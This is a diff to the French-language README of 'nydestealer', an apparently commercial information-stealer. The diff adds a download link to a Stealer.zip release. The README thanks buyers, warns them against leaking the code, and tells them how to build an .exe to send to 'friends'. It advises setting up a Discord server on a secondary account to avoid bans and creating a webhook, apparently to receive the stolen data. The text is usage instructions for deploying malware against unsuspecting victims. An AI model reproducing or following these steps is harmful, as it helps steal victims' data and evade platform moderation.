@@ -1,5 +1,7 @@
 # nydestealer
 
+Release : [Stealer.zip](https://github.com/nydehunter/nydestealer/files/13719128/Stealer.zip)
+
 1. Tout d'abord, merci d'avoir acheté notre fichier. Sachez que toute divulgation de notre code pourrait vous conduire à un bannissement des futures mises à jour de notre Stealer.
 
 2. Pour construire votre fichier .exe afin de l'envoyer à vos prochains amis, vous devez au préalable créer un serveur Discord. Je vous conseille de le faire sur un double compte pour éviter de vous faire bannir votre compte principal. Une fois votre serveur Discord créé, vous devez créer un webhook. C'est simple ! Allez dans les paramètres d'un de vos channels, cliquez sur "Intégration", puis "Webhook", et copiez le lien de votre Webhook.
